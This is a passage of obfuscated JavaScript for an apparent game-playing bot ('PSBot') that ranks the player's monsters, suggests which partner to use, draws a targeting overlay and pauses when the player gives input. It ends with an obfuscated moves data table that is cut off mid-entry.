                const WEATHER_MUL = { water: 1.5, fire: 1.5, rock: 1.3, ice: 1.3 };
                const AFK_KINDS = [_0xstr(0x21a), _0xstr(0x21b), _0xstr(0x21c), _0xstr(0x21d)];
                function power(g, sv, dex) {
                    const mon = g.DEX_BY[dex];
                    if (!mon)
                        return 0;
                    let pool = [];
                    try {
                        pool = g.startChoices(dex);
                    }
                    catch { }
                    const abil = ((g.DEX_ABIL && g.DEX_ABIL[dex]) || []).filter(Boolean);
                    let off = 0;
                    for (const id of pool) {
                        const m = g.Moves.BY_ID[id];
                        if (!m || !(AFK_KINDS.includes(m.kind) || (m.kind === _0xstr(0x21e) && m.homing)))
                            continue;
                        let v = (mon.atk || 1) * (m.cat && g.Stats ? g.Stats.fit(mon, m.cat) : 1);
                        if (mon.types.length === 1 && m.type === mon.types[0])
                            v *= 1.2;
                        for (const a of abil)
                            if (WEATHER_OF[a] === m.type)
                                v *= WEATHER_MUL[m.type];
                        off = Math.max(off, v);
                    }
                    if (!off)
                        off = (mon.atk || 1) * 0.6;
                    const tough = Math.sqrt((mon.hp || 80) / 100 * (((mon.df || 60) + (mon.sd || 60)) / 180));
                    const u = (sv.pupg || {})[dex] || {};
                    const inv = 0.04 * (u.atk || 0) + 0.03 * (u.cd || 0) + 0.02 * (u.def || 0) + 0.01 * (u.hp || 0) + 0.015 * (u.crit || 0) + 0.01 * (u.regen || 0);
                    return off * Math.sqrt(tough) * (0.8 + 0.2 * (mon.spd || 100) / 110) * (1 + inv);
                }
                let sugg = { at: -1e9, text: '' };
                function suggestion() {
                    const g = G(), sv = g && g.DB && g.DB.save;
                    if (!sv || !sv.owned || !g.DEX_BY || !g.startChoices || !g.Moves || !g.Game || ![_0xstr(0x21f), _0xstr(0x220)].includes(g.Game.state))
                        return '';
                    if (now() - sugg.at < 5000)
                        return sugg.text;
                    const fmt = n => n.toFixed(2).replace(_0xstr(0x221), _0xstr(0x222));
                    const name = d => (g.T ? g.T(g.DEX_BY[d].name) : g.DEX_BY[d].name);
                    const ranked = Object.keys(sv.owned).map(Number).filter(d => g.DEX_BY[d]).map(d => ({ d, p: power(g, sv, d) })).sort((a, b) => b.p - a.p);
                    const cur = ranked.find(r => r.d === sv.partner), best = ranked[0];
                    let text = '';
                    if (best) {
                        text = _0xstr(0x223) + ranked.slice(0, 3).map(r => `${name(r.d)} ${fmt(r.p)}`).join(_0xstr(0x224));
                        if (cur)
                            text += cur.p >= best.p / 1.15 ? `\nĐang dùng ${name(cur.d)} ${fmt(cur.p)}: đã gần mạnh nhất` : `\nĐang dùng ${name(cur.d)} ${fmt(cur.p)}: nên đổi`;
                    }
                    sugg = { at: now(), text };
                    return text;
                }
                const choices = () => { const g = G(); return !!(g && g.RunUI && g.RunUI.showBond && g.RunUI.showBond.psbot); };
                function overlay(cam) {
                    const X = x => x * cam.s + cam.e, Y = y => y * cam.s + cam.f, t = S.target, route = S.plan && S.plan.path;
                    return {
                        target: t ? { x: X(t.fx ?? t.x), y: Y(t.fy ?? t.y) } : null,
                        wp: t && t.fx !== undefined ? { x: X(t.x), y: Y(t.y) } : null,
                        path: route ? route.pts.map(([x, y]) => ({ x: X(x), y: Y(y) })) : [],
                        pdir: S.out,
                    };
                }
                return { active, on, steer, tick, holdSlot, card, bond, item, choices, runOver, menuOpen, restartButton, suggestion, overlay, mode: () => S.mode };
            };
            if (!window.__psbotPauseKey) {
                window.__psbotPauseKey = true;
                window.__psbotUserPause = 0;
                addEventListener(_0xstr(0x225), e => {
                    const g = window.G;
                    if (e.isTrusted && (e.key === _0xstr(0x226) || e.code === _0xstr(0x227)) && g && g.Game && g.Game.state === _0xstr(0x228))
                        window.__psbotUserPause = performance.now();
                }, true);
            }
            if (!window.__psbotInputKey) {
                window.__psbotInputKey = true;
                window.__psbotUserInput = 0;
                for (const type of [_0xstr(0x229), _0xstr(0x22a), _0xstr(0x22b)])
                    addEventListener(type, e => { if (e.isTrusted)
                        window.__psbotUserInput = performance.now(); }, { capture: true, passive: true });
            }
        },
        "sites/default/data.js": () => {
            window.PSBotData = {
                "tags": {
                    "canvas:14x14": _0xstr(0x22c),
                    "canvas:12x12": _0xstr(0x22d),
                    "fill:#c08a10": _0xstr(0x22e),
                    "canvas:12x12#7x5s9s": _0xstr(0x22f),
                    "canvas:12x12#fekrpx": _0xstr(0x230),
                    "canvas:16x14#ldeyzb": _0xstr(0x231),
                    "canvas:24x20#rnyi1k": _0xstr(0x232),
                    "canvas:12x12#vzq2jt": _0xstr(0x233),
                    "canvas:18x27#7g5qft": _0xstr(0x234),
                    "canvas:12x12#f4e03h": _0xstr(0x235),
                    "canvas:34x16#b7rvrb": _0xstr(0x236),
                    "canvas:18x27#55vk03": _0xstr(0x237),
                    "canvas:30x46#19t7965": _0xstr(0x238),
                    "canvas:30x46#3z2atg": _0xstr(0x239),
                    "canvas:30x46#15cn96h": _0xstr(0x23a),
                    "canvas:30x46#ur12zp": _0xstr(0x23b),
                    "canvas:12x12#gc1xn4": _0xstr(0x23c),
                    "canvas:12x12#1eqc0pm": _0xstr(0x23d),
                    "canvas:18x27#1jo3ilw": _0xstr(0x23e),
                    "canvas:26x40#ezvds9": _0xstr(0x23f),
                    "canvas:12x12#1hzeh1l": _0xstr(0x240),
                    "canvas:30x40#tn4wsn": _0xstr(0x241),
                    "canvas:18x27#1nzfd19": _0xstr(0x242),
                    "canvas:12x12#1ko4idv": _0xstr(0x243),
                    "fill:#ffd95e": _0xstr(0x244)
                },
                "builds": {}
            };
        },
        "core/moves.js": () => {
            window.PSBotMoves = { "moves": [{ "id": _0xstr(0x245), "name": _0xstr(0x246), "type": _0xstr(0x247), "kind": _0xstr(0x248), "cat": _0xstr(0x249), "dmg": 16, "cd": 0.5, "desc": _0xstr(0x24a), "evo": _0xstr(0x24b) }, { "id": _0xstr(0x24c), "name": _0xstr(0x24d), "type": _0xstr(0x24e), "kind": _0xstr(0x24f), "cat": _0xstr(0x250), "dmg": 20, "cd": 0.75, "desc": _0xstr(0x251), "evo": _0xstr(0x252) }, { "id": _0xstr(0x253), "name": _0xstr(0x254), "type": _0xstr(0x255), "kind": _0xstr(0x256), "cat": _0xstr(0x257), "cd": 0.85, "stat": _0xstr(0x258), "desc": _0xstr(0x259) }, { "id": _0xstr(0x25a), "name": _0xstr(0x25b), "type": _0xstr(0x25c), "kind": _0xstr(0x25d), "cat": _0xstr(0x25e), "cd": 0.85, "stat": _0xstr(0x25f), "desc": _0xstr(0x260) }, { "id": _0xstr(0x261), "name": _0xstr(0x262), "type": _0xstr(0x263), "kind": _0xstr(0x264), "cat": _0xstr(0x265), "cd": 0.85, "stat": _0xstr(0x266), "desc": _0xstr(0x267) }, { "id": _0xstr(0x268), "name": _0xstr(0x269), "type": _0xstr(0x26a), "kind": _0xstr(0x26b), "cat": _0xstr(0x26c), "cd": 0.85, "stat": _0xstr(0x26d), "desc": _0xstr(0x26e) }, { "id": _0xstr(0x26f), "name": _0xstr(0x270), "type": _0xstr(0x271), "kind": _0xstr(0x272), "cat": _0xstr(0x273), "dmg": 18, "cd": 0.52, "desc": _0xstr(0x274), "evo": _0xstr(0x275) }, { "id": _0xstr(0x276), "name": _0xstr(0x277), "type": _0xstr(0x278), "kind": _0xstr(0x279), "cat": _0xstr(0x27a), "dmg": 7, "cd": 0.7, "desc": _0xstr(0x27b), "evo": _0xstr(0x27c) }, { "id": _0xstr(0x27d), "name": _0xstr(0x27e), "type": _0xstr(0x27f), "kind": _0xstr(0x280), "cat": _0xstr(0x281), "dmg": 14, "cd": 0.3, "desc": _0xstr(0x282), "evo": _0xstr(0x283) }, { "id": _0xstr(0x284), "name": _0xstr(0x285), "type": _0xstr(0x286), "kind": _0xstr(0x287), "cat": _0xstr(0x288), "dmg": 13, "cd": 1.25, "desc": _0xstr(0x289), "evo": _0xstr(0x28a) }, { "id": _0xstr(0x28b), "name": _0xstr(0x28c), "type": _0xstr(0x28d), "kind": _0xstr(0x28e), "cat": _0xstr(0x28f), "dmg": 14, "cd": 0.44, "desc": _0xstr(0x290), "evo": _0xstr(0x291) }, { "id": _0xstr(0x292), "name": _0xstr(0x293), "type": _0xstr(0x294), "kind": _0xstr(0x295), "cat": _0xstr(0x296), "dmg": 9, "cd": 1, "desc": _0xstr(0x297), "evo": _0xstr(0x298) }, { "id": _0xstr(0x299), "name": _0xstr(0x29a), "type": _0xstr(0x29b), "kind": _0xstr(0x29c), "cat": _0xstr(0x29d), "dmg": 29, "cd": 1.5, "desc": _0xstr(0x29e), "evo": _0xstr(0x29f) }, { "id": _0xstr(0x2a0), "name": _0xstr(0x2a1), "type": _0xstr(0x2a2), "kind": _0xstr(0x2a3), "cat": _0xstr(0x2a4), "cd": 0.9, "stat": _0xstr(0x2a5), "desc": _0xstr(0x2a6) }, { "id": _0xstr(0x2a7), "name": _0xstr(0x2a8), "type": _0xstr(0x2a9), "kind": _0xstr(0x2aa), "cat": _0xstr(0x2ab), "dmg": 19, "cd": 0.62, "desc": _0xstr(0x2ac), "evo": _0xstr(0x2ad) }, { "id": _0xstr(0x2ae), "name": _0xstr(0x2af), "type": _0xstr(0x2b0), "kind": _0xstr(0x2b1), "cat": _0xstr(0x2b2), "dmg": 10, "cd": 0.9, "desc": _0xstr(0x2b3), "evo": _0xstr(0x2b4) }, { "id": _0xstr(0x2b5), "name": _0xstr(0x2b6), "type": _0xstr(0x2b7), "kind": _0xstr(0x2b8), "cat": _0xstr(0x2b9), "dmg": 14, "cd": 0.26, "desc": _0xstr(0x2ba), "evo": _0xstr(0x2bb) }, { "id": _0xstr(0x2bc), "name": _0xstr(0x2bd), "type": _0xstr(0x2be), "kind": _0xstr(0x2bf), "cat": _0xstr(0x2c0), "dmg": 9, "cd": 0.55, "desc": _0xstr(0x2c1), "evo": _0xstr(0x2c2) }, { "id": _0xstr(0x2c3), "name": _0xstr(0x2c4), "type": _0xstr(0x2c5), "kind": _0xstr(0x2c6), "cat": _0xstr(0x2c7), "dmg": 13, "cd": 0.4, "desc": _0xstr(0x2c8), "evo": _0xstr(0x2c9) }, { "id": _0xstr(0x2ca), "name": _0xstr(0x2cb), "type": _0xstr(0x2cc), "kind": _0xstr(0x2cd), "cat": _0xstr(0x2ce), "dmg": 8, "cd": 0.45, "desc": _0xstr(0x2cf), "evo": _0xstr(0x2d0) }, { "id": _0xstr(0x2d1), "name": _0xstr(0x2d2), "type": _0xstr(0x2d3), "kind": _0xstr(0x2d4), "cat": _0xstr(0x2d5), "dmg": 21, "cd": 0.95, "desc": _0xstr(0x2d6), "evo": _0xstr(0x2d7) }, { "id": _0xstr(0x2d8), "name": _0xstr(0x2d9), "type": _0xstr(0x2da), "kind": _0xstr(0x2db), "cat": _0xstr(0x2dc), "dmg": 13, "cd": 0.58, "desc": _0xstr(0x2dd), "evo": _0xstr(0x2de) }, { "id": _0xstr(0x2df), "name": _0xstr(0x2e0), "type": _0xstr(0x2e1), "kind": _0xstr(0x2e2), "cat": _0xstr(0x2e3), "dmg": 17, "cd": 1.15, "desc": _0xstr(0x2e4), "evo": _0xstr(0x2e5) }, { "id": _0xstr(0x2e6), "name": _0xstr(0x2e7), "type": _0xstr(0x2e8), "kind": _0xstr(0x2e9), "cat": _0xstr(0x2ea), "dmg": 10, "cd": 1.35, "desc": _0xstr(0x2eb), "evo": _0xstr(0x2ec) }, { "id": _0xstr(0x2ed), "name": _0xstr(0x2ee), "type": _0xstr(0x2ef), "kind": _0xstr(0x2f0), "cat": _0xstr(0x2f1), "dmg": 17, "cd": 0.6, "desc": _0xstr(0x2f2), "evo": _0xstr(0x2f3) }, { "id": _0xstr(0x2f4), "name": _0xstr(0x2f5), "type": _0xstr(0x2f6), "kind": _0xstr(0x2f7), "cat": _0xstr(0x2f8), "dmg": 11, "cd": 1.1, "desc": _0xstr(0x2f9), "evo": _0xstr(0x2fa) }, { "id": _0xstr(0x2fb), "name": _0xstr(0x2fc), "type": _0xstr(0x2fd), "kind": _0xstr(0x2fe), "cat": _0xstr(0x2ff), "dmg": 13, "cd": 0.26, "desc": _0xstr(0x300), "evo": _0xstr(0x301) }, { "id": _0xstr(0x302), "name": _0xstr(0x303), "type": _0xstr(0x304), "kind": _0xstr(0x305), "cat": _0xstr(0x306), "dmg": 17, "cd": 0.55, "desc": _0xstr(0x307), "evo": _0xstr(0x308) }, { "id": _0xstr(0x309), "name": _0xstr(0x30a), "type": _0xstr(0x30b), "kind": _0xstr(0x30c), "cat": _0xstr(0x30d), "dmg": 36, "cd": 0.95, "desc": _0xstr(0x30e), "evo": _0xstr(0x30f) }, { "id": _0xstr(0x310), "name": _0xstr(0x311), "type": _0xstr(0x312), "kind": _0xstr(0x313), "cat": _0xstr(0x314), "dmg": 12, "cd": 1.15, "desc": _0xstr(0x315), "evo": _0xstr(0x316) }, { "id": _0xstr(0x317), "name": _0xstr(0x318), "type": _0xstr(0x319), "kind": _0xstr(0x31a), "cat": _0xstr(0x31b), "dmg": 8, "cd": 0.34, "desc": _0xstr(0x31c), "evo": _0xstr(0x31d) }, { "id": _0xstr(0x31e), "name": _0xstr(0x31f), "type": _0xstr(0x320), "kind": _0xstr(0x321), "cat": _0xstr(0x322), "dmg": 6, "cd": 0.3, "desc": _0xstr(0x323), "evo": _0xstr(0x324) }, { "id": _0xstr(0x325), "name": _0xstr(0x326), "type": _0xstr(0x327), "kind": _0xstr(0x328), "cat": _0xstr(0x329), "dmg": 11, "cd": 0.7, "desc": _0xstr(0x32a), "evo": _0xstr(0x32b) }, { "id": _0xstr(0x32c), "name": _0xstr(0x32d), "type": _0xstr(0x32e), "kind": _0xstr(0x32f), "cat": _0xstr(0x330), "dmg": 13, "cd": 0.42, "desc": _0xstr(0x331), "evo": _0xstr(0x332) }, { "id": _0xstr(0x333), "name": _0xstr(0x334), "type": _0xstr(0x335), "kind": _0xstr(0x336), "cat": _0xstr(0x337), "dmg": 14, "cd": 1.1, "desc": _0xstr(0x338), "evo": _0xstr(0x339) }, { "id": _0xstr(0x33a), "name": _0xstr(0x33b), "type": _0xstr(0x33c), "kind": _0xstr(0x33d), "cat": _0xstr(0x33e), "dmg": 8, "cd": 0.45, "desc": _0xstr(0x33f), "evo": _0xstr(0x340) }, { "id": _0xstr(0x341), "name": _0xstr(0x342), "type": _0xstr(0x343), "kind": _0xstr(0x344), "cat": _0xstr(0x345), "dmg": 24, "cd": 0.7, "desc": _0xstr(0x346), "evo": _0xstr(0x347) }, { "id": _0xstr(0x348), "name": _0xstr(0x349), "type": _0xstr(0x34a), "kind": _0xstr(0x34b), "cat": _0xstr(0x34c), "dmg": 21, "cd": 1.3, "desc": _0xstr(0x34d), "evo": _0xstr(0x34e) }, { "id": _0xstr(0x34f), "name": _0xstr(0x350), "type": _0xstr(0x351), "kind": _0xstr(0x352), "cat": _0xstr(0x353), "dmg": 20, "cd": 1.1, "desc": _0xstr(0x354), "evo": _0xstr(0x355) }, { "id": _0xstr(0x356), "name": _0xstr(0x357), "type": _0xstr(0x358), "kind": _0xstr(0x359), "cat": _0xstr(0x35a), "dmg": 8, "cd": 0.55, "desc": _0xstr(0x35b), "evo": _0xstr(0x35c) }, { "id": _0xstr(0x35d), "name": _0xstr(0x35e), "type": _0xstr(0x35f), "kind": _0xstr(0x360), "cat": _0xstr(0x361), "dmg": 22, "cd": 0.5, "desc": _0xstr(0x362), "evo": _0xstr(0x363) }, { "id": _0xstr(0x364), "name": _0xstr(0x365), "type": _0xstr(0x366), "kind": _0xstr(0x367), "cat": _0xstr(0x368), "dmg": 17, "cd": 0.62, "desc": _0xstr(0x369), "evo": _0xstr(0x36a) }, { "id": _0xstr(0x36b), "name": _0xstr(0x36c), "type": _0xstr(0x36d), "kind": _0xstr(0x36e), "cat": _0xstr(0x36f), "dmg": 14, "cd": 0.48, "desc": _0xstr(0x370), "evo": _0xstr(0x371) }, { "id": _0xstr(0x372), "name": _0xstr(0x373), "type": _0xstr(0x374), "kind": _0xstr(0x375), "cat": _0xstr(0x376), "dmg": 19, "cd": 0.66, "desc": _0xstr(0x377), "evo": _0xstr(0x378) }, { "id": _0xstr(0x379), "name": _0xstr(0x37a), "type": _0xstr(0x37b), "kind": _0xstr(0x37c), "cat": _0xstr(0x37d), "dmg": 24, "cd": 1, "desc": _0xstr(0x37e), "evo": _0xstr(0x37f) }, { "id": _0xstr(0x380), "name": _0xstr(0x381), "type": _0xstr(0x382), "kind": _0xstr(0x383), "cat": _0xstr(0x384), "cd": 0.7, "stat": _0xstr(0x385), "desc": _0xstr(0x386) }, { "id": _0xstr(0x387), "name": _0xstr(0x388), "type": _0xstr(0x389), "kind": _0xstr(0x38a), "cat": _0xstr(0x38b), "dmg": 11, "cd": 1, "desc": _0xstr(0x38c), "evo": _0xstr(0x38d) }, { "id": _0xstr(0x38e), "name": _0xstr(0x38f), "type": _0xstr(0x390), "kind": _0xstr(0x391), "cat": _0xstr(0x392), "dmg": 9, "cd": 0.5, "desc": _0xstr(0x393), "evo": _0xstr(0x394) }, { "id": _0xstr(0x395), "name": _0xstr(0x396), "type": _0xstr(0x397), "kind": _0xstr(0x398), "cat": _0xstr(0x399), "dmg": 18, "cd": 0.5, "desc": _0xstr(0x39a), "evo": _0xstr(0x39b) }, { "id": _0xstr(0x39c), "name": _0xstr(0x39d), "type": _0xstr(0x39e), "kind": _0xstr(0x39f), "cat": _0xstr(0x3a0), "dmg": 23, "cd": 1.05, "desc": _0xstr(0x3a1), "evo": _0xstr(0x3a2) }, { "id": _0xstr(0x3a3), "name": _0xstr(0x3a4), "type": _0xstr(0x3a5), "kind": _0xstr(0x3a6), "cat": _0xstr(0x3a7), "dmg": 17, "cd": 0.45, "desc": _0xstr(0x3a8), "evo": _0xstr(0x3a9) }, { "id": _0xstr(0x3aa), "name": _0xstr(0x3ab), "type": _0xstr(0x3ac), "kind": _0xstr(0x3ad), "cat": _0xstr(0x3ae), "dmg": 14, "cd": 1.15, "desc": _0xstr(0x3af), "evo": _0xstr(0x3b0) }, { "id": _0xstr(0x3b1), "name": _0xstr(0x3b2), "type": _0xstr(0x3b3), "kind": _0xstr(0x3b4), "cat": _0xstr(0x3b5), "dmg": 9, "cd": 0.5, "desc": _0xstr(0x3b6), "evo": _0xstr(0x3b7) }, { "id": _0xstr(0x3b8), "name": _0xstr(0x3b9), "type": _0xstr(0x3ba), "kind": _0xstr(0x3bb), "cat": _0xstr(0x3bc), "dmg": 16, "cd": 0.95, "desc": _0xstr(0x3bd), "evo": _0xstr(0x3be) }, { "id": _0xstr(0x3bf), "name": _0xstr(0x3c0), "type": _0xstr(0x3c1), "kind": _0xstr(0x3c2), "cat": _0xstr(0x3c3), "dmg": 9, "cd": 0.8, "desc": _0xstr(0x3c4), "evo": _0xstr(0x3c5) }, { "id": _0xstr(0x3c6), "name": _0xstr(0x3c7), "type": _0xstr(0x3c8), "kind": _0xstr(0x3c9), "cat": _0xstr(0x3ca), "dmg": 18, "cd": 1.2, "desc": _0xstr(0x3cb), "evo": _0xstr(0x3cc) }, { "id": _0xstr(0x3cd), "name": _0xstr(0x3ce), "type": _0xstr(0x3cf), "kind": _0xstr(0x3d0), "cat": _0xstr(0x3d1), "dmg": 11, "cd": 1.1, "desc": _0xstr(0x3d2), "evo": _0xstr(0x3d3) }, { "id": _0xstr(0x3d4), "name": _0xstr(0x3d5), "type": _0xstr(0x3d6), "kind": _0xstr(0x3d7), "cat": _0xstr(0x3d8), "dmg": 18, "cd": 1.2, "desc": _0xstr(0x3d9), "evo": _0xstr(0x3da) }, { "id": _0xstr(0x3db), "name": _0xstr(0x3dc), "type": _0xstr(0x3dd), "kind": _0xstr(0x3de), "cat": _0xstr(0x3df), "dmg": 24, "cd": 1.4, "desc": _0xstr(0x3e0), "evo": _0xstr(0x3e1) }, { "id": _0xstr(0x3e2), "name": _0xstr(0x3e3), "type": _0xstr(0x3e4), "kind": _0xstr(0x3e5), "cat": _0xstr(0x3e6), "dmg": 15, "cd": 3.5, "desc": _0xstr(0x3e7), "evo": _0xstr(0x3e8) }, { "id": _0xstr(0x3e9), "name": _0xstr(0x3ea), "type": _0xstr(0x3eb), "kind": _0xstr(0x3ec), "cat": _0xstr(0x3ed), "dmg": 14, "cd": 4, "desc": _0xstr(0x3ee), "evo": _0xstr(0x3ef) }, { "id": _0xstr(0x3f0), "name": _0xstr(0x3f1), "type": _0xstr(0x3f2), "kind": _0xstr(0x3f3), "cat": _0xstr(0x3f4), "dmg": 18, "cd": 0.75, "desc": _0xstr(0x3f5), "evo": _0xstr(0x3f6) }, { "id": _0xstr(0x3f7), "name": _0xstr(0x3f8), "type": _0xstr(0x3f9), "kind": _0xstr(0x3fa), "cat": _0xstr(0x3fb), "dmg": 10, "cd": 0.28, "desc": _0xstr(0x3fc), "evo": _0xstr(0x3fd) }, { "id": _0xstr(0x3fe), "name": _0xstr(0x3ff), "type": _0xstr(0x400), "kind": _0xstr(0x401), "cat": _0xstr(0x402), "dmg": 6, "cd": 0.65, "desc": _0xstr(0x403), "evo": _0xstr(0x404) }, { "id": _0xstr(0x405), "name": _0xstr(0x406), "type": _0xstr(0x407), "kind": _0xstr(0x408), "cat": _0xstr(0x409), "dmg": 17, "cd": 0.9, "desc": _0xstr(0x40a), "evo": _0xstr(0x40b) }, { "id": _0xstr(0x40c), "name": _0xstr(0x40d), "type": _0xstr(0x40e), "kind": _0xstr(0x40f), "cat": _0xstr(0x410), "dmg": 58, "cd": 2.2, "desc": _0xstr(0x411), "evo": _0xstr(0x412) }, { "id": _0xstr(0x413), "name": _0xstr(0x414), "type": _0xstr(0x415), "kind": _0xstr(0x416), "cat": _0xstr(0x417), "dmg": 9, "cd": 1, "desc": _0xstr(0x418), "evo": _0xstr(0x419) }, { "id": _0xstr(0x41a), "name": _0xstr(0x41b), "type": _0xstr(0x41c), "kind": _0xstr(0x41d), "cat": _0xstr(0x41e), "dmg": 19, "cd": 0.8, "desc": _0xstr(0x41f), "evo": _0xstr(0x420) }, { "id": _0xstr(0x421), "name": _0xstr(0x422), "type": _0xstr(0x423), "kind": _0xstr(0x424), "cat": _0xstr(0x425), "dmg": 8, "cd": 3, "desc": _0xstr(0x426), "evo": _0xstr(0x427) }, { "id": _0xstr(0x428), "name": _0xstr(0x429), "type": _0xstr(0x42a), "kind": _0xstr(0x42b), "cat": _0xstr(0x42c), "dmg": 10, "cd": 0.6, "desc": _0xstr(0x42d), "evo": _0xstr(0x42e) }, { "id": _0xstr(0x42f), "name": _0xstr(0x430), "type": _0xstr(0x431), "kind": _0xstr(0x432), "cat": _0xstr(0x433), "dmg": 19, "cd": 0.62, "desc": _0xstr(0x434), "evo": _0xstr(0x435) }, { "id": _0xstr(0x436), "name": _0xstr(0x437), "type": _0xstr(0x438), "kind": _0xstr(0x439), "cat": _0xstr(0x43a), "dmg": 62, "cd": 2.3, "desc": _0xstr(0x43b), "evo": _0xstr(0x43c) }, { "id": _0xstr(0x43d), "name": _0xstr(0x43e), "type": _0xstr(0x43f), "kind": _0xstr(0x440), "cat": _0xstr(0x441), "dmg": 22, "cd": 1.6, "desc": _0xstr(0x442), "evo": _0xstr(0x443) }, { "id": _0xstr(0x444), "name": _0xstr(0x445), "type": _0xstr(0x446), "kind": _0xstr(0x447), "cat": _0xstr(0x448), "dmg": 10, "cd": 0.62, "desc": _0xstr(0x449), "evo": _0xstr(0x44a) }, { "id": _0xstr(0x44b), "name": _0xstr(0x44c), "type": _0xstr(0x44d), "kind": _0xstr(0x44e), "cat": _0xstr(0x44f), "dmg": 16, "cd": 1.2, "desc": _0xstr(0x450), "evo": _0xstr(0x451) }, { "id": _0xstr(0x452), "name": _0xstr(0x453), "type": _0xstr(0x454), "kind": _0xstr(0x455), "cat": _0xstr(0x456), "dmg": 13, "cd": 0.55, "desc": _0xstr(0x457), "evo": _0xstr(0x458) }, { "id": _0xstr(0x459), "name": _0xstr(0x45a), "type": _0xstr(0x45b), "kind": _0xstr(0x45c), "cat": _0xstr(0x45d), "dmg": 8, "cd": 0.66, "desc": _0xstr(0x45e), "evo": _0xstr(0x45f) }, { "id": _0xstr(0x460), "name": _0xstr(0x461), "type": _0xstr(0x462), "kind": _0xstr(0x463), "cat": _0xstr(0x464), "dmg": 9, "cd": 3, "desc": _0xstr(0x465), "evo": _0xstr(0x466) }, { "id": _0xstr(0x467), "name": _0xstr(0x468), "type": _0xstr(0x469), "kind": _0xstr(0x46a), "cat": _0xstr(0x46b), "dmg": 18, "cd": 1.15, "desc": _0xstr(0x46c), "evo": _0xstr(0x46d) }, { "id": _0xstr(0x46e), "name": _0xstr(0x46f), "type": _0xstr(0x470), "kind": _0xstr(0x471), "cat": _0xstr(0x472), "dmg": 14, "cd": 1.1, "desc": _0xstr(0x473), "evo": _0xstr(0x474) }, { "id": _0xstr(0x475), "name": _0xstr(0x476), "type": _0xstr(0x477), "kind": _0xstr(0x478), "cat": _0xstr(0x479), "dmg": 9, "cd": 0.55, "desc": _0xstr(0x47a), "evo": _0xstr(0x47b) }, { "id": _0xstr(0x47c), "name": _0xstr(0x47d), "type": _0xstr(0x47e), "kind": _0xstr(0x47f), "cat": _0xstr(0x480), "dmg": 10, "cd": 0.6, "desc": _0xstr(0x481), "evo": _0xstr(0x482) }, { "id": _0xstr(0x483), "name": _0xstr(0x484), "type": _0xstr(0x485), "kind": _0xstr(0x486), "cat": _0xstr(0x487), "dmg": 17, "cd": 0.7, "desc": _0xstr(0x488), "evo": _0xstr(0x489) }, { "id": _0xstr(0x48a), "name": _0xstr(0x48b), "type": _0xstr(0x48c), "kind": _0xstr(0x48d), "cat": _0xstr(0x48e), "dmg": 31, "cd": 1.7, "desc": _0xstr(0x48f), "evo": _0xstr(0x490) }, { "id": _0xstr(0x491), "name": _0xstr(0x492), "type": _0xstr(0x493), "kind": _0xstr(0x494), "cat": _0xstr(0x495), "dmg": 13, "cd": 0.28, "desc": _0xstr(0x496), "evo": _0xstr(0x497) }, { "id": _0xstr(0x498), "name": _0xstr(0x499), "type": _0xstr(0x49a), "kind": _0xstr(0x49b), "cat": _0xstr(0x49c), "dmg": 11, "cd": 0.66, "desc": _0xstr(0x49d), "evo": _0xstr(0x49e) }, { "id": _0xstr(0x49f), "name": _0xstr(0x4a0), "type": _0xstr(0x4a1), "kind": _0xstr(0x4a2), "cat": _0xstr(0x4a3), "dmg": 9, "cd": 0.32, "desc": _0xstr(0x4a4), "evo": _0xstr(0x4a5) }, { "id": _0xstr(0x4a6), "name": _0xstr(0x4a7), "type": _0xstr(0x4a8), "kind": _0xstr(0x4a9), "cat": _0xstr(0x4aa), "dmg": 24, "cd": 1.6, "desc": _0xstr(0x4ab), "evo": _0xstr(0x4ac) }, { "id": _0xstr(0x4ad), "name": _0xstr(0x4ae), "type": _0xstr(0x4af), "kind": _0xstr(0x4b0), "cat": _0xstr(0x4b1), "dmg": 11, "cd": 0.95, "desc": _0xstr(0x4b2), "evo": _0xstr(0x4b3) }, { "id": _0xstr(0x4b4), "name": _0xstr(0x4b5), "type": _0xstr(0x4b6), "kind": _0xstr(0x4b7), "cat": _0xstr(0x4b8), "dmg": 17, "cd": 1.1, "desc": _0xstr(0x4b9), "evo": _0xstr(0x4ba) }, { "id": _0xstr(0x4bb), "name": _0xstr(0x4bc), "type": _0xstr(0x4bd), "kind": _0xstr(0x4be), "cat": _0xstr(0x4bf), "dmg": 33, "cd": 1.7, "desc": _0xstr(0x4c0), "evo": _0xstr(0x4c1) }, { "id": _0xstr(0x4c2), "name": _0xstr(0x4c3), "type": _0xstr(0x4c4), "kind": _0xstr(0x4c5), "cat": _0xstr(0x4c6), "dmg": 14, "cd": 0.45, "desc": _0xstr(0x4c7), "evo": _0xstr(0x4c8) }, { "id": _0xstr(0x4c9), "name": _0xstr(0x4ca), "type": _0xstr(0x4cb), "kind": _0xstr(0x4cc), "cat": _0xstr(0x4cd), "dmg": 9, "cd": 3, "desc": _0xstr(0x4ce), "evo": _0xstr(0x4cf) }, { "id": _0xstr(0x4d0), "name": _0xstr(0x4d1), "type": _0xstr(0x4d2), "kind": _0xstr(0x4d3), "cat": _0xstr(0x4d4), "dmg": 7, "cd": 0.7, "desc": _0xstr(0x4d5), "evo": _0xstr(0x4d6) }, { "id": _0xstr(0x4d7), "name": _0xstr(0x4d8), "type": _0xstr(0x4d9), "kind": _0xstr(0x4da), "cat": _0xstr(0x4db), "dmg": 23, "cd": 0.52, "desc": _0xstr(0x4dc), "evo": _0xstr(0x4dd) }, { "id": _0xstr(0x4de), "name": _0xstr(0x4df), "type": _0xstr(0x4e0), "kind": _0xstr(0x4e1), "cat": _0xstr(0x4e2), "dmg": 12, "cd": 1.1, "desc": _0xstr(0x4e3), "evo": _0xstr(0x4e4) }, { "id": _0xstr(0x4e5), "name": _0xstr(0x4e6), "type": _0xstr(0x4e7), "kind": _0xstr(0x4e8), "cat": _0xstr(0x4e9), "dmg": 13, "cd": 0.55, "desc": _0xstr(0x4ea), "evo": _0xstr(0x4eb) }, { "id": _0xstr(0x4ec), "name": _0xstr(0x4ed), "type": _0xstr(0x4ee), "kind": _0xstr(0x4ef), "cat": _0xstr(0x4f0), "dmg": 26, "cd": 0.6, "desc": _0xstr(0x4f1), "evo": _0xstr(0x4f2) }, { "id": _0xstr(0x4f3), "name": _0xstr(0x4f4), "type": _0xstr(0x4f5), "kind": _0xstr(0x4f6), "cat": _0xstr(0x4f7), "dmg": 15, "cd": 1.15, "desc": _0xstr(0x4f8), "evo": _0xstr(0x4f9) }, { "id": _0xstr(0x4fa), "name": _0xstr(0x4fb), "type": _0xstr(0x4fc), "kind": _0xstr(0x4fd), "cat": _0xstr(0x4fe), "dmg": 10, "cd": 0.64, "desc": _0xstr(0x4ff), "evo": _0xstr(0x500) }, { "id": _0xstr(0x501), "name": _0xstr(0x502), "type": _0xstr(0x503), 